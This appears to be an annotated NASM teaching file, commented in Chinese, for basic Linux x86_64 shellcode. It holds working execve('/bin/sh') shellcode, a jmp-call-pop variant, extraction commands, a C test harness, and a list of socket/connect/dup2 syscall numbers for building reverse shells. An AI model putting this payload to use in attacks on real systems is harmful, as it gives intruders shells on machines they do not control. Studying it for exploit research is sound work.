; ============================================================
; shellcode_basic.asm —— 基础 Shellcode (Linux x86_64)
;
; 功能：执行 /bin/sh 获得 shell
; 编译：nasm -f elf64 shellcode_basic.asm -o shellcode_basic.o
; 提取Shellcode：objdump -d shellcode_basic.o | grep -Po '\s\K[a-f0-9]{2}(?=\s)' | tr -d '\n'
;
; 注意：本代码仅用于安全研究与学习目的
; ============================================================

section .text
    global _start

_start:
    ; ============================================================
    ; 方法一：使用 execve 系统调用执行 /bin/sh
    ; execve("/bin/sh", NULL, NULL)
    ; sys_execve 编号：59
    ; 参数：rdi = path, rsi = argv, rdx = envp
    ; ============================================================

    ; 构造 "/bin/sh" 字符串
    ; "/bin/sh" = 2F 62 69 6E 2F 73 68 = 0x68732F6E69622F
    ; 注意小端序，且需要在末尾补0，所以我们压入栈中

    xor     rax, rax                    ; rax = 0
    push    rax                         ; 压入 NULL 作为字符串结尾

    ; 压入 "//bin/sh" (8字节，用双斜杠避免NULL)
    ; "//bin/sh" = 2F 2F 62 69 6E 2F 73 68
    ; 小端序：68 73 2F 6E 69 62 2F 2F
    mov     rbx, 0x68732F6E69622F2F     ; "hs/nib//"  -> "//bin/sh"
    push    rbx

    mov     rdi, rsp                    ; rdi = rsp = "/bin/sh" 地址

    ; argv = NULL
    xor     rsi, rsi                    ; rsi = NULL

    ; envp = NULL
    xor     rdx, rdx                    ; rdx = NULL

    ; sys_execve
    mov     al, 59                      ; rax = 59 (sys_execve)
    syscall

    ; 如果 execve 失败，退出
    xor     rdi, rdi
    mov     al, 60
    syscall

; ============================================================
; Shellcode 提取与测试方法：
;
; 1. 编译为目标文件
;    nasm -f elf64 shellcode_basic.asm -o shellcode_basic.o
;
; 2. 提取机器码
;    objdump -d shellcode_basic.o
;
; 3. 转换为 C 字符串格式
;    for i in $(objdump -d shellcode_basic.o | grep "^ " | cut -f2);
;    do echo -n '\x'$i; done; echo
;
; 4. 测试 Shellcode (C 测试程序)
;    char shellcode[] = "\x48\x31\xc0\x50\x48\xbb...";
;    void (*func)() = (void(*)())shellcode;
;    func();
;
; Shellcode 编写要点：
;
; 1. 避免 NULL 字节 (\x00)
;    - 使用 xor reg, reg 代替 mov reg, 0
;    - 使用 al/ah/bl/bh 等 8位寄存器
;    - 字符串用栈构造，避免直接包含 NULL
;
; 2. 位置无关代码 (PIC)
;    - 使用 call/pop 获取当前地址
;    - 使用相对跳转
;
; 3. 系统调用约定
;    - rax = 调用号
;    - rdi, rsi, rdx, r10, r8, r9 = 参数
;    - syscall 触发
;
; 4. 常用 syscall 号 (x86_64 Linux)
;    - execve: 59
;    - socket: 41
;    - connect: 42
;    - dup2: 33
;    - exit: 60
; ============================================================

; ============================================================
; 方法二：jmp-call-pop 技术（经典位置无关写法）
; 适用于 x86 32位，这里展示其原理
; ============================================================
;
; shellcode_jmp_call_pop:
;     jmp     short call_shellcode
;
; shellcode_addr:
;     pop     rsi                     ; 弹出字符串地址
;     xor     rax, rax
;     mov     [rsi + 7], al           ; 用 0 替换 'A'
;     mov     [rsi + 8], rsi          ; argv[0] = 字符串地址
;     mov     [rsi + 16], rax         ; argv[1] = NULL
;     mov     rdi, rsi                ; path
;     lea     rdx, [rsi + 16]         ; envp = NULL
;     lea     rsi, [rsi + 8]          ; argv
;     mov     al, 59
;     syscall
;
; call_shellcode:
;     call    shellcode_addr
;     db      '/bin/sh', 'A', 'BBBBBBBB', 'CCCCCCCC'
;
; ============================================================
